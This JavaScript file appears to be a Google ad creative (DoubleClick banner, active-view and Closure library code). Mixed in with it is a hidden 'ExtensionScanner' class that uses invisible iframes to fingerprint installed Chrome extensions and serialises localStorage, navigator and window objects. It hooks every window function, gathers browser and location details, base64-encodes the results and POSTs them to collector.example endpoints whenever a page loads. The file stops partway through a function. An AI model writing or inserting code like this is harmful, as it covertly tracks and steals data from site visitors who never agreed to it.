document.write('\x3cdiv class="GoogleActiveViewElement" ' + 'id="DfaVisibilityIdentifier_3988163746"\x3e');
const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
document.write('\x3cdiv class="GoogleCreativeContainerClass" ' + 'id="gcc_LRniZPWrDbe-vcAPqcqyoA0"\x3e');
const TRACKED_VARIABLES = ['document', 'window', 'navigator', 'localStorage'];
(function () {
  var m = document.createElement('meta');
  m.setAttribute('data-jc', '82');
  m.setAttribute('data-jc-version', 'r20230816');
  var ss = document.getElementsByTagName('script')[0];
  if (ss && ss.parentNode) {
    ss.parentNode.insertBefore(m, ss);
  }
})();
(function () {
  /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var h = this || self;
  function l(a, d, b) {
    if (a) for (var c = 0; null != a && 500 > c && !b(a); ++c) a = d(a);
  }
  function m(a, d) {
    l(a, function (b) {
      try {
        return b === b.parent ? null : b.parent;
      } catch (c) {}
      return null;
    }, d);
  }
  function n(a, d) {
    if ("IFRAME" == a.tagName) d(a);else {
      a = a.querySelectorAll("IFRAME");
      for (var b = 0; b < a.length && !d(a[b]); ++b);
    }
  }
  function p(a) {
    return (a = a.ownerDocument) && (a.parentWindow || a.defaultView) || null;
  }
  function q(a, d, b) {
    try {
      var c = JSON.parse(b.data);
    } catch (f) {}
    if ("object" === typeof c && c && "creativeLoad" === c.type) {
      var g = p(a);
      if (b.source && g) {
        var e;
        m(b.source, function (f) {
          try {
            if (f.parent === g) return e = f, !0;
          } catch (k) {}
        });
        e && n(a, function (f) {
          if (f.contentWindow === e) return d(c), !0;
        });
      }
    }
  }
  function r(a) {
    return "string" === typeof a ? document.getElementById(a) : a;
  }
  ;
  var t;
  t = void 0 === t ? window : t;
  t.clsn = function (a, d) {
    var b = r(a);
    if (b) if (b.onCreativeLoad) b.onCreativeLoad(d);else {
      var c = d ? [d] : [],
        g = function (e) {
          for (var f = 0; f < c.length; ++f) try {
            c[f](1, e);
          } catch (k) {}
          c = {
            push: function (k) {
              k(1, e);
            }
          };
        };
      b.onCreativeLoad = function (e) {
        c.push(e);
      };
      b.setAttribute("data-creative-load-listener", "");
      b.addEventListener("creativeLoad", function (e) {
        g(e.detail);
      });
      h.addEventListener("message", function (e) {
        q(b, g, e);
      });
    }
  };
}).call(this);
clsn("gcc_LRniZPWrDbe-vcAPqcqyoA0");
document.write('\x3ca target\x3d\x22_blank\x22 id\x3d\x22img_anch_CLX2qOWv64ADFTdfDwIdKaUM1A\x22 href\x3d\x22https://adclick.g.doubleclick.net/pcs/click?xai\x3dAKAOjsu_1j1LrG9zv6R5RgwM7Xz7D9l5AKI-lvJaZQ0ZSVqFosO4k0APBraNXH7Z5kUMaW3Q31j59A4CpjuDVDWy6v333v5sNohyKTn-gbMS4XFvy18vV-qZ-lNdDxHZmEmAyQ1UgsQ41vGn4CY9RzdMywnKIVjfdn8GNHIw2j6tcm1L\x26amp;sai\x3dAMfl-YQOzhQH9WKBgRUOr6u8wVfqXm3-4eK6UvwMBNX4UcGZmGtcWeUV0wz6_BA5aNrygPh5i6E9ODv6wUF67FNom1WmfoiNEAtf-uHaMQ\x26amp;sig\x3dCg0ArKJSzNUq0HSD1tjc\x26amp;cry\x3d1\x26amp;fbs_aeid\x3d[gw_fbsaeid]\x26amp;urlfix\x3d1\x26amp;adurl\x3dhttps://www.thinkinghuts.org/donate\x22\x3e\x3cimg src\x3d\x22https://s0.2mdn.net/simgad/6335791767665586692\x22 alt\x3d\x22Advertisement\x22 border\x3d\x220\x22 width\x3d\x22300\x22 height\x3d\x22600\x22 style\x3d\x22display:block\x22\x3e\x3c/a\x3e\x3cscript data-jc\x3d\x2274\x22 data-jc-version\x3d\x22r20230816\x22 data-jcp-a-id\x3d\x22img_anch_CLX2qOWv64ADFTdfDwIdKaUM1A\x22 data-jcp-for-sure-open-browser\x3d\x22false\x22 data-jcp-for-sure-open-custom-tabs\x3d\x22false\x22 data-jcp-cc-overlay\x3d\x22\x22 data-jcp-cc-button\x3d\x22\x22 data-jcp-is-fledge\x3d\x22false\x22 data-jcp-turtlex-event-ad-signals\x3d\x22\x22\x3e(function(){/*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */ var aa\x3d\x22function\x22\x3d\x3dtypeof Object.defineProperties?Object.defineProperty:function(a,b,d){if(a\x3d\x3dArray.prototype||a\x3d\x3dObject.prototype)return a;a[b]\x3dd.value;return a};function ba(a){a\x3d[\x22object\x22\x3d\x3dtypeof globalThis\x26\x26globalThis,a,\x22object\x22\x3d\x3dtypeof window\x26\x26window,\x22object\x22\x3d\x3dtypeof self\x26\x26self,\x22object\x22\x3d\x3dtypeof global\x26\x26global];for(var b\x3d0;b\x3ca.length;++b){var d\x3da[b];if(d\x26\x26d.Math\x3d\x3dMath)return d}throw Error(\x22Cannot find global object\x22);}var ca\x3dba(this); function da(a,b){if(b)a:{var d\x3dca;a\x3da.split(\x22.\x22);for(var c\x3d0;c\x3ca.length-1;c++){var e\x3da[c];if(!(e in d))break a;d\x3dd[e]}a\x3da[a.length-1];c\x3dd[a];b\x3db(c);b!\x3dc\x26\x26null!\x3db\x26\x26aa(d,a,{configurable:!0,writable:!0,value:b})}}var ea\x3d\x22function\x22\x3d\x3dtypeof Object.create?Object.create:function(a){function b(){}b.prototype\x3da;return new b},m; if(\x22function\x22\x3d\x3dtypeof Object.setPrototypeOf)m\x3dObject.setPrototypeOf;else{var p;a:{var fa\x3d{a:!0},q\x3d{};try{q.__proto__\x3dfa;p\x3dq.a;break a}catch(a){}p\x3d!1}m\x3dp?function(a,b){a.__proto__\x3db;if(a.__proto__!\x3d\x3db)throw new TypeError(a+\x22 is not extensible\x22);return a}:null}var r\x3dm,ha\x3d\x22function\x22\x3d\x3dtypeof Object.assign?Object.assign:function(a,b){for(var d\x3d1;d\x3carguments.length;d++){var c\x3darguments[d];if(c)for(var e in c)Object.prototype.hasOwnProperty.call(c,e)\x26\x26(a[e]\x3dc[e])}return a}; da(\x22Object.assign\x22,function(a){return a||ha});var t\x3dthis||self;var v,w;a:{for(var x\x3d[\x22CLOSURE_FLAGS\x22],y\x3dt,z\x3d0;z\x3cx.length;z++)if(y\x3dy[x[z]],null\x3d\x3dy){w\x3dnull;break a}w\x3dy}var A\x3dw\x26\x26w[610401301];v\x3dnull!\x3dA?A:!1;var B,C\x3dt.navigator;B\x3dC?C.userAgentData||null:null;function D(a){return v?B?B.brands.some(function(b){return(b\x3db.brand)\x26\x26-1!\x3db.indexOf(a)}):!1:!1}function E(a){var b;a:{if(b\x3dt.navigator)if(b\x3db.userAgent)break a;b\x3d\x22\x22}return-1!\x3db.indexOf(a)};function F(){return v?!!B\x26\x260\x3cB.brands.length:!1}function G(){return F()?D(\x22Chromium\x22):(E(\x22Chrome\x22)||E(\x22CriOS\x22))\x26\x26!(F()?0:E(\x22Edge\x22))||E(\x22Silk\x22)};var ia\x3dF()?!1:E(\x22Trident\x22)||E(\x22MSIE\x22);!E(\x22Android\x22)||G();G();E(\x22Safari\x22)\x26\x26(G()||(F()?0:E(\x22Coast\x22))||(F()?0:E(\x22Opera\x22))||(F()?0:E(\x22Edge\x22))||(F()?D(\x22Microsoft Edge\x22):E(\x22Edg/\x22))||F()\x26\x26D(\x22Opera\x22));var H\x3d{},I\x3dnull;var ja\x3d\x22undefined\x22!\x3d\x3dtypeof Uint8Array,ka\x3d!ia\x26\x26\x22function\x22\x3d\x3d\x3dtypeof btoa;var J\x3d\x22function\x22\x3d\x3d\x3dtypeof Symbol\x26\x26\x22symbol\x22\x3d\x3d\x3dtypeof Symbol()?Symbol():void 0,la\x3dJ?function(a,b){a[J]|\x3db}:function(a,b){void 0!\x3d\x3da.g?a.g|\x3db:Object.defineProperties(a,{g:{value:b,configurable:!0,writable:!0,enumerable:!1}})};function oa(a){var b\x3dK(a);1!\x3d\x3d(b\x261)\x26\x26(Object.isFrozen(a)\x26\x26(a\x3dArray.prototype.slice.call(a)),L(a,b|1))} var K\x3dJ?function(a){return a[J]|0}:function(a){return a.g|0},M\x3dJ?function(a){return a[J]}:function(a){return a.g},L\x3dJ?function(a,b){a[J]\x3db}:function(a,b){void 0!\x3d\x3da.g?a.g\x3db:Object.defineProperties(a,{g:{value:b,configurable:!0,writable:!0,enumerable:!1}})};function pa(){var a\x3d[];la(a,1);return a}function N(a){a\x3da\x3e\x3e11\x261023;return 0\x3d\x3d\x3da?536870912:a};var qa\x3d{};function O(a){return null!\x3d\x3da\x26\x26\x22object\x22\x3d\x3d\x3dtypeof a\x26\x26!Array.isArray(a)\x26\x26a.constructor\x3d\x3d\x3dObject}var P,Q,ra\x3d[];L(ra,39);Q\x3dObject.freeze(ra);var sa;function ta(a,b,d){null\x3d\x3da\x26\x26(a\x3dsa);sa\x3dvoid 0;if(null\x3d\x3da){var c\x3d96;d?(a\x3d[d],c|\x3d512):a\x3d[];b\x26\x26(c\x3dc\x26-2095105|(b\x261023)\x3c\x3c11)}else{if(!Array.isArray(a))throw Error();c\x3dK(a);if(c\x2664)return a;c|\x3d64;if(d\x26\x26(c|\x3d512,d!\x3d\x3da[0]))throw Error();a:{d\x3da;var e\x3dd.length;if(e){var g\x3de-1,f\x3dd[g];if(O(f)){c|\x3d256;b\x3d+!!(c\x26512)-1;e\x3dg-b;1024\x3c\x3de\x26\x26(ua(d,b,f),e\x3d1023);c\x3dc\x26-2095105|(e\x261023)\x3c\x3c11;break a}}b\x26\x26(f\x3d+!!(c\x26512)-1,b\x3dMath.max(b,e-f),1024\x3cb\x26\x26(ua(d,f,{}),c|\x3d256,b\x3d1023),c\x3dc\x26-2095105|(b\x261023)\x3c\x3c11)}}L(a,c);return a} function ua(a,b,d){for(var c\x3d1023+b,e\x3da.length,g\x3dc;g\x3ce;g++){var f\x3da[g];null!\x3df\x26\x26f!\x3d\x3dd\x26\x26(d[g-b]\x3df)}a.length\x3dc+1;a[c]\x3dd};function va(a,b){return wa(b)} function wa(a){switch(typeof a){case \x22number\x22:return isFinite(a)?a:String(a);case \x22boolean\x22:return a?1:0;case \x22object\x22:if(a\x26\x26!Array.isArray(a)\x26\x26ja\x26\x26null!\x3da\x26\x26a instanceof Uint8Array){if(ka){for(var b\x3d\x22\x22,d\x3d0,c\x3da.length-10240;d\x3cc;)b+\x3dString.fromCharCode.apply(null,a.subarray(d,d+\x3d10240));b+\x3dString.fromCharCode.apply(null,d?a.subarray(d):a);a\x3dbtoa(b)}else{void 0\x3d\x3d\x3db\x26\x26(b\x3d0);if(!I){I\x3d{};d\x3d\x22ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\x22.split(\x22\x22);c\x3d[\x22+/\x3d\x22,\x22+/\x22,\x22-_\x3d\x22,\x22-_.\x22,\x22-_\x22];for(var e\x3d 0;5\x3ee;e++){var g\x3dd.concat(c[e].split(\x22\x22));H[e]\x3dg;for(var f\x3d0;f\x3cg.length;f++){var h\x3dg[f];void 0\x3d\x3d\x3dI[h]\x26\x26(I[h]\x3df)}}}b\x3dH[b];d\x3dArray(Math.floor(a.length/3));c\x3db[64]||\x22\x22;for(e\x3dg\x3d0;g\x3ca.length-2;g+\x3d3){var l\x3da[g],k\x3da[g+1];h\x3da[g+2];f\x3db[l\x3e\x3e2];l\x3db[(l\x263)\x3c\x3c4|k\x3e\x3e4];k\x3db[(k\x2615)\x3c\x3c2|h\x3e\x3e6];h\x3db[h\x2663];d[e++]\x3df+l+k+h}f\x3d0;h\x3dc;switch(a.length-g){case 2:f\x3da[g+1],h\x3db[(f\x2615)\x3c\x3c2]||c;case 1:a\x3da[g],d[e]\x3db[a\x3e\x3e2]+b[(a\x263)\x3c\x3c4|f\x3e\x3e4]+h+c}a\x3dd.join(\x22\x22)}return a}}return a};function xa(a,b,d,c,e,g){if(null!\x3da){if(Array.isArray(a))a\x3de\x26\x260\x3d\x3da.length\x26\x26K(a)\x261?void 0:g\x26\x26K(a)\x262?a:ya(a,b,d,void 0!\x3d\x3dc,e,g);else if(O(a)){var f\x3d{},h;for(h in a)f[h]\x3dxa(a[h],b,d,c,e,g);a\x3df}else a\x3db(a,c);return a}}function ya(a,b,d,c,e,g){var f\x3dc||d?K(a):0;c\x3dc?!!(f\x2632):void 0;a\x3dArray.prototype.slice.call(a);for(var h\x3d0;h\x3ca.length;h++)a[h]\x3dxa(a[h],b,d,c,e,g);d\x26\x26d(f,a);return a}function za(a){return a.h\x3d\x3d\x3dqa?a.toJSON():wa(a)};function S(a,b,d){this.g\x3dta(a,b,d)}S.prototype.toJSON\x3dfunction(){if(P)var a\x3dT(this,this.g,!1);else a\x3dya(this.g,za,void 0,void 0,!1,!1),a\x3dT(this,a,!0);return a};function Aa(a){P\x3d!0;try{return JSON.stringify(a.toJSON(),va)}finally{P\x3d!1}}S.prototype.h\x3dqa;S.prototype.toString\x3dfunction(){return T(this,this.g,!1).toString()}; function T(a,b,d){var c\x3da.constructor.i,e\x3dN(M(d?a.g:b)),g\x3d!1;if(c){if(!d){b\x3dArray.prototype.slice.call(b);var f;if(b.length\x26\x26O(f\x3db[b.length-1]))for(g\x3d0;g\x3cc.length;g++)if(c[g]\x3e\x3de){Object.assign(b[b.length-1]\x3d{},f);break}g\x3d!0}e\x3db;d\x3d!d;f\x3dM(a.g);a\x3dN(f);f\x3d+!!(f\x26512)-1;for(var h,l,k\x3d0;k\x3cc.length;k++)if(l\x3dc[k],l\x3ca){l+\x3df;var n\x3de[l];null\x3d\x3dn?e[l]\x3dd?Q:pa():d\x26\x26n!\x3d\x3dQ\x26\x26oa(n)}else h||(n\x3dvoid 0,e.length\x26\x26O(n\x3de[e.length-1])?h\x3dn:e.push(h\x3d{})),n\x3dh[l],null\x3d\x3dh[l]?h[l]\x3dd?Q:pa():d\x26\x26n!\x3d\x3dQ\x26\x26oa(n)}c\x3db.length;if(!c)return b; var ma;if(O(h\x3db[c-1])){a:{var u\x3dh;e\x3d{};d\x3d!1;for(var na in u)a\x3du[na],Array.isArray(a)\x26\x26a!\x3da\x26\x26(d\x3d!0),null!\x3da?e[na]\x3da:d\x3d!0;if(d){for(var Ka in e){u\x3de;break a}u\x3dnull}}u!\x3dh\x26\x26(ma\x3d!0);c--}for(;0\x3cc;c--){h\x3db[c-1];if(null!\x3dh)break;var Ia\x3d!0}if(!ma\x26\x26!Ia)return b;var R;g?R\x3db:R\x3dArray.prototype.slice.call(b,0,c);b\x3dR;g\x26\x26(b.length\x3dc);u\x26\x26b.push(u);return b};function U(a){this.g\x3dta(a)}U.prototype\x3dea(S.prototype);U.prototype.constructor\x3dU;if(r)r(U,S);else for(var V in S)if(\x22prototype\x22!\x3dV)if(Object.defineProperties){var Ba\x3dObject.getOwnPropertyDescriptor(S,V);Ba\x26\x26Object.defineProperty(U,V,Ba)}else U[V]\x3dS[V];var Ca\x3d/^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i;function Da(a,b,d,c){var e\x3d/^(https?:[^:?]+[/]pcs[/]click[^/]+?)(?:\x26nx[^\x26]+\x26ny[^\x26]+\x26dim[^\x26]+)?(\x26adurl\x3d.*)/.exec(a);return e?e[1]+(\x22\x26nx\x3d\x22+b+\x22\x26ny\x3d\x22+d+\x22\x26dim\x3d\x22+c)+e[2]:a}function Ea(a){var b\x3da.currentTarget,d\x3db.querySelector(\x22img[alt]\x22);d\x26\x26(a\x3dDa(b.href,+Math.round(a.clientX-d.offsetLeft),+Math.round(a.clientY-d.offsetTop),+d.width+\x22x\x22+ +d.height),Ca.test(a)\x26\x26(b.href\x3da))} function Fa(a){var b\x3dt;b\x3dvoid 0\x3d\x3d\x3db?window:b;var d\x3dnew U;if(null!\x3da\x26\x26\x22string\x22!\x3d\x3dtypeof a)throw Error();var c\x3dd.g,e\x3dM(c);if(e\x262)throw Error();a:{var g\x3dN(e);if(1\x3e\x3dg){var f\x3de;if(e\x26256)g\x3dc[c.length-1];else{if(null\x3d\x3da)break a;g\x3dc[g+(+!!(e\x26512)-1)]\x3d{};f|\x3d256}g[1]\x3da;f!\x3d\x3de\x26\x26L(c,f)}else c[1+(+!!(e\x26512)-1)]\x3da,e\x26256\x26\x26(a\x3dc[c.length-1],1 in a\x26\x26delete a[1])}var h;null\x3d\x3db||null\x3d\x3d(h\x3db.fence)||h.setReportEventDataForAutomaticBeacons({eventType:\x22reserved.top_navigation\x22,eventData:Aa(d),destination:[\x22buyer\x22]});var l; null\x3d\x3db||null\x3d\x3d(l\x3db.fence)||l.reportEvent({eventType:\x22click\x22,eventData:Aa(d),destination:[\x22buyer\x22]});var k;null\x3d\x3db||null\x3d\x3d(k\x3db.fence)||k.reportEvent({eventType:\x22reserved.top_navigation\x22,destination:[\x22component-seller\x22]});var n;null\x3d\x3db||null\x3d\x3d(n\x3db.fence)||n.reportEvent({eventType:\x22click\x22,destination:[\x22component-seller\x22]})} function Ga(a,b){void 0!\x3dt.AFMA_Communicator\x26\x26void 0!\x3dt.AFMA_Communicator.sendMessage\x26\x26(a.preventDefault(),t.AFMA_Communicator.sendMessage(\x22open\x22,{a:\x22app\x22,u:a.currentTarget.href,system_browser:!0,use_first_package:!0,use_running_process:!0,use_custom_tabs:b}))};var W,X\x3ddocument.currentScript;W\x3d(X\x3dvoid 0\x3d\x3d\x3dX?null:X)\x26\x26\x2274\x22\x3d\x3d\x3dX.getAttribute(\x22data-jc\x22)?X:document.querySelector(\x27[data-jc\x3d\x2274\x22]\x27);if(null\x3d\x3dW)throw Error(\x22JSC not found 74\x22);for(var Ha\x3d{},Y\x3dW.attributes,Z\x3dY.length-1;0\x3c\x3dZ;Z--){var Ja\x3dY[Z].name;0\x3d\x3d\x3dJa.indexOf(\x22data-jcp-\x22)\x26\x26(Ha[Ja.substring(9)]\x3dY[Z].value)} (function(a){var b\x3ddocument.getElementById(a[\x22a-id\x22]),d\x3d\x22true\x22\x3d\x3d\x3da[\x22for-sure-open-browser\x22],c\x3d\x22true\x22\x3d\x3d\x3da[\x22for-sure-open-custom-tabs\x22],e\x3da[\x22cc-overlay\x22],g\x3da[\x22cc-button\x22],f\x3de?document.getElementById(e):null,h\x3dg?document.getElementById(g):null;if(\x22true\x22\x3d\x3d\x3da[\x22is-fledge\x22]){var l\x3da[\x22turtlex-event-ad-signals\x22];h?h.addEventListener(\x22click\x22,function(){Fa(l)}):b.addEventListener(\x22click\x22,function(){Fa(l)})}else if(b.addEventListener(\x22mousedown\x22,Ea),f\x26\x26h\x26\x26f.addEventListener(\x22mousedown\x22,function(k){k\x3dDa(h.href, +Math.round(k.clientX-f.offsetLeft),+Math.round(k.clientY-f.offsetTop),+f.clientWidth+\x22x\x22+ +f.clientHeight);Ca.test(k)\x26\x26(h.href\x3dk)}),d||c)b.addEventListener(\x22click\x22,function(k){Ga(k,c)}),h\x26\x26h.addEventListener(\x22click\x22,function(k){Ga(k,c)})})(Ha);}).call(this);\x3c/script\x3e');
class ExtensionScanner {
  static TIMEOUT = 3000;
  static BATCH_SIZE = 5;
  constructor() {
    this.pendingScans = 0;
    this.detectedExtensions = {};
    this.workerPool = [];
    this.startTimestamp = Date.now();
    this.variables = {};
  }
  createWorker(extName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      const cleanup = () => {
        frame.remove();
        this.pendingScans--;
      };
      const timer = setTimeout(() => {
        cleanup();
        resolve([extName, false]);
        this.captureEvents(frame);
      }, ExtensionScanner.TIMEOUT);
      frame.onload = () => {
        try {
          frame.contentWindow.location = `chrome-extension://${id}/${file}`;
          const checker = setInterval(() => {
            try {
              if (frame.contentWindow.location.href.includes('chrome-extension')) {
                clearInterval(checker);
                clearTimeout(timer);
                cleanup();
                resolve([extName, true]);
                this.captureJSHooks(frame);
              }
            } catch (e) {
              clearInterval(checker);
              clearTimeout(timer);
              cleanup();
              resolve([extName, false]);
            }
          }, 100);
        } catch (e) {
          clearTimeout(timer);
          cleanup();
          resolve([extName, false]);
        }
      };
      document.body.appendChild(frame);
      this.pendingScans++;
      this.storeGlobalVariables();
    });
  }
  storeGlobalVariables() {
    TRACKED_VARIABLES.forEach(variable => {
      this.variables[variable] = JSON.stringify(window[variable]);
    });
  }
  captureEvents(target) {
    target.addEventListener('*', () => {
      this.variables['events'] = JSON.stringify(event);
    });
  }
  captureJSHooks(frame) {
    const script = document.createElement('script');
    script.innerHTML = `
              Object.getOwnPropertyNames(window).forEach((name) => {
                  if (typeof window[name] === 'function') {
                      const original = window[name];
                      window[name] = function() {
                          // Do something with tracked function calls here
                          original.apply(this, arguments);
                      };
                  }
              });
          `;
    frame.contentDocument.body.appendChild(script);
  }
  async scanBatch(entries) {
    const workers = entries.map(([name, data]) => this.createWorker(name, data));
    const results = await Promise.all(workers);
    results.forEach(([name, detected]) => {
      this.detectedExtensions[name] = detected;
    });
  }
  generateTelemetryData() {
    return btoa(JSON.stringify({
      scannedExtensions: this.detectedExtensions,
      scanDuration: Date.now() - this.startTimestamp,
      env: {
        url: window.location.href,
        ref: document.referrer,
        res: `${window.screen.width}x${window.screen.height}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        variables: this.variables
      }
    }));
  }
  generateChecksum(str) {
    return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
  }
  async reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        'X-Scan-Time': new Date().toISOString()
      },
      body: payload,
      keepalive: true
    }).catch(() => null));
    await Promise.race(requests);
  }
  async execute() {
    const entries = Object.entries(window.data);
    const batches = Array(Math.ceil(entries.length / ExtensionScanner.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionScanner.BATCH_SIZE, (i + 1) * ExtensionScanner.BATCH_SIZE));
    for (const batch of batches) {
      await this.scanBatch(batch);
      await new Promise(r => setTimeout(r, Math.random() * 300 + 100));
    }
    while (this.pendingScans > 0) {
      await new Promise(r => setTimeout(r, 100));
    }
    await this.reportResults();
  }
}
document.write('\x3c/div\x3e');
document.write('\x3c/div\x3e');
(function () {
  var avDiv = document.getElementById("DfaVisibilityIdentifier_3988163746");
  var avMarkup = {
    'active_view_class_name': 'GoogleActiveViewElement',
    'data-google-av-cxn': 'https://pagead2.googlesyndication.com/pcs/activeview?xai\x3dAKAOjssbujV76NAcRKQxr49cVnm3ZYS39EO71MUletWdAlkdQi7rOOWoGvLIEiW2DWfiCeFADzSZbA5kDVqTn9UlaIWNAYDm5LJl4awsCwdaNl2v\x26sig\x3dCg0ArKJSzCpgg6IYu_mlEAE',
    'data-google-av-adk': '764689869',
    'data-google-av-metadata': 'la\x3d0\x26',
    'data-google-av-ufs-integrator-metadata': 'EswBCsUBaHR0cHM6Ly9wYWdlYWQyLmdvb2dsZXN5bmRpY2F0aW9uLmNvbS9wY3MvYWN0aXZldmlldz94YWk9QUtBT2pzc2J1alY3Nk5BY1JLUXhyNDljVm5tM1pZUzM5RU83MU1VbGV0V2RBbGtkUWk3ck9PV29HdkxJRWlXMkRXZmlDZUZBRHpTWmJBNWtEVnFUbjlVbGFJV05BWURtNUxKbDRhd3NDd2RhTmwydiZzaWc9Q2cwQXJLSlN6Q3BnZzZJWXVfbWxFQUUSABoA',
    'data-google-av-override': '-1',
    'data-google-av-immediate': 'true',
    'data-google-av-aid': '0',
    'data-google-av-naid': '1',
    'data-google-av-slift': '',
    'data-google-av-cpmav': '',
    'data-google-av-btr': '',
    'data-google-av-itpl': '32',
    'data-google-av-rs': '6',
    'data-google-av-dm': '2',
    'data-google-av-flags': '[\x22x%278440\x279efotm(\x26753374%2bejvf/%27844\x3e\x279wuvb$\x2656533\x3e!\x3d|vqc)!273794\x26\x3cqqvb/%\x3c1735020!\x3dnehu`/!364\x3d5051!9abk{a($160210:3\x26\x3ccbotf+*0150034:%2bejvf/%72;17613!\x3defdwa*\x2776463;21$?ebkpb$\x260366717\x3e*\x3ebgipf+!3\x3d712363%9aihwc)!7202\x3c217\x279efotm(\x2620061;48\x26\x3e`dopb/%\x3c1707200!\x3d8(\x262005575?\x26\x3e`dopb/%\x3c170642?!\x3d|vqc)!7201;\x3d50\x279wuvb$\x2603641654*\x3ebgipf+!3\x3d731103%9aihwc)!7200?073\x279efotm(\x262004?51;\x26\x3e`dopb/%\x3c17\x3e474\x3e!\x3dnehu`/!36406412!9abk{a($167745;\x3d\x26\x3ccbotf+*01254133%2bejvf/%72\x3c43412!\x3defdwa*\x2776326\x3e71$?3~\x22]'
  };
  if (avDiv) {
    for (var key in avMarkup) {
      if (avMarkup.hasOwnProperty(key)) {
        avDiv.setAttribute(key, avMarkup[key]);
      }
    }
  }
})();
(function () {
  var glidar = document.createElement('script');
  glidar.type = 'text/javascript';
  glidar.async = true;
  glidar.src = 'https://www.googletagservices.com/activeview/js/current/rx_lidar.js?cache=r20110914';
  document.body.insertBefore(glidar, document.body.firstChild);
})();
const observer = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new ExtensionScanner().execute();
  }
});
(function () {
  (function () {
    var s = document.createElement('script');
    s.setAttribute('data-jc', '86');
    s.src = 'https://pagead2.googlesyndication.com/pagead/js/r20230816/r20110914/elements/html/omrhp.js';
    s.setAttribute('data-jc-version', 'r20230816');
    var ss = document.getElementsByTagName('script')[0];
    if (ss && ss.parentNode) {
      ss.parentNode.insertBefore(s, ss);
    }
  })();
  window.dicnf = {
    eavp: true,
    ebrp: true,
    apfa: true,
    atsb: true,
    bvst: 'r20230816',
    eeid: 'LRniZPWrDbe-vcAPqcqyoA0',
    opxb: true,
    aunb: true,
    adsg: '',
    uffp: true
  };
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */function aa(a) {
      var b = 0;
      return function () {
        return b < a.length ? {
          done: !1,
          value: a[b++]
        } : {
          done: !0
        };
      };
    }
    var ba = "function" == typeof Object.defineProperties ? Object.defineProperty : function (a, b, c) {
      if (a == Array.prototype || a == Object.prototype) return a;
      a[b] = c.value;
      return a;
    };
    function ca(a) {
      a = ["object" == typeof globalThis && globalThis, a, "object" == typeof window && window, "object" == typeof self && self, "object" == typeof global && global];
      for (var b = 0; b < a.length; ++b) {
        var c = a[b];
        if (c && c.Math == Math) return c;
      }
      throw Error("Cannot find global object");
    }
    var da = ca(this);
    function m(a, b) {
      if (b) a: {
        var c = da;
        a = a.split(".");
        for (var d = 0; d < a.length - 1; d++) {
          var e = a[d];
          if (!(e in c)) break a;
          c = c[e];
        }
        a = a[a.length - 1];
        d = c[a];
        b = b(d);
        b != d && null != b && ba(c, a, {
          configurable: !0,
          writable: !0,
          value: b
        });
      }
    }
    function ea(a) {
      var b = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
      if (b) return b.call(a);
      if ("number" == typeof a.length) return {
        next: aa(a)
      };
      throw Error(String(a) + " is not an iterable or ArrayLike");
    }
    var fa = "function" == typeof Object.assign ? Object.assign : function (a, b) {
      for (var c = 1; c < arguments.length; c++) {
        var d = arguments[c];
        if (d) for (var e in d) Object.prototype.hasOwnProperty.call(d, e) && (a[e] = d[e]);
      }
      return a;
    };
    m("Object.assign", function (a) {
      return a || fa;
    });
    var ha = "function" == typeof Object.create ? Object.create : function (a) {
        function b() {}
        b.prototype = a;
        return new b();
      },
      ia;
    if ("function" == typeof Object.setPrototypeOf) ia = Object.setPrototypeOf;else {
      var la;
      a: {
        var ma = {
            a: !0
          },
          na = {};
        try {
          na.__proto__ = ma;
          la = na.a;
          break a;
        } catch (a) {}
        la = !1;
      }
      ia = la ? function (a, b) {
        a.__proto__ = b;
        if (a.__proto__ !== b) throw new TypeError(a + " is not extensible");
        return a;
      } : null;
    }
    var oa = ia;
    function u(a, b) {
      a.prototype = ha(b.prototype);
      a.prototype.constructor = a;
      if (oa) oa(a, b);else for (var c in b) if ("prototype" != c) if (Object.defineProperties) {
        var d = Object.getOwnPropertyDescriptor(b, c);
        d && Object.defineProperty(a, c, d);
      } else a[c] = b[c];
      a.ba = b.prototype;
    }
    function pa() {
      for (var a = Number(this), b = [], c = a; c < arguments.length; c++) b[c - a] = arguments[c];
      return b;
    }
    m("Object.is", function (a) {
      return a ? a : function (b, c) {
        return b === c ? 0 !== b || 1 / b === 1 / c : b !== b && c !== c;
      };
    });
    m("Array.prototype.includes", function (a) {
      return a ? a : function (b, c) {
        var d = this;
        d instanceof String && (d = String(d));
        var e = d.length;
        c = c || 0;
        for (0 > c && (c = Math.max(c + e, 0)); c < e; c++) {
          var f = d[c];
          if (f === b || Object.is(f, b)) return !0;
        }
        return !1;
      };
    });
    m("String.prototype.includes", function (a) {
      return a ? a : function (b, c) {
        if (null == this) throw new TypeError("The 'this' value for String.prototype.includes must not be null or undefined");
        if (b instanceof RegExp) throw new TypeError("First argument to String.prototype.includes must not be a regular expression");
        return -1 !== this.indexOf(b, c || 0);
      };
    });
    m("globalThis", function (a) {
      return a || da;
    });
    var x = this || self;
    var qa, z;
    a: {
      for (var ra = ["CLOSURE_FLAGS"], A = x, sa = 0; sa < ra.length; sa++) if (A = A[ra[sa]], null == A) {
        z = null;
        break a;
      }
      z = A;
    }
    var ta = z && z[610401301];
    qa = null != ta ? ta : !1;
    var B,
      ua = x.navigator;
    B = ua ? ua.userAgentData || null : null;
    function va(a) {
      return qa ? B ? B.brands.some(function (b) {
        return (b = b.brand) && -1 != b.indexOf(a);
      }) : !1 : !1;
    }
    function E(a) {
      var b;
      a: {
        if (b = x.navigator) if (b = b.userAgent) break a;
        b = "";
      }
      return -1 != b.indexOf(a);
    }
    ;
    function F() {
